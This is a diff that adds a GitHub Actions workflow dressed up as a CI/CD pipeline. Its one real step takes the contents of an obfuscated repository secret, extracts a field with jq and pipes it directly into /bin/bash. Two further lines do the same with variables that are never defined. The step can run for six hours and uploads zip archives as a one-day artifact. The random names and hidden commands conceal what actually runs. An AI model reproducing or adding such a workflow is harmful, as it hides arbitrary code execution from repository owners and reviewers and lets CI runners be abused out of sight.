@@ -1,0 +1,27 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          imz877: ${{ secrets.imz877 }}
+        run: |
+          printf '%s' "$imz877" | jq -r .zb46369 | /bin/bash
+          printf '%s' "$zujxt32" | jq -r .gjh41 | /bin/bash
+          printf '%s' "$jyt45" | jq -r .bxrk12 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: F8Pm9aZF
+          path: "*.zip"
+          retention-days: 1
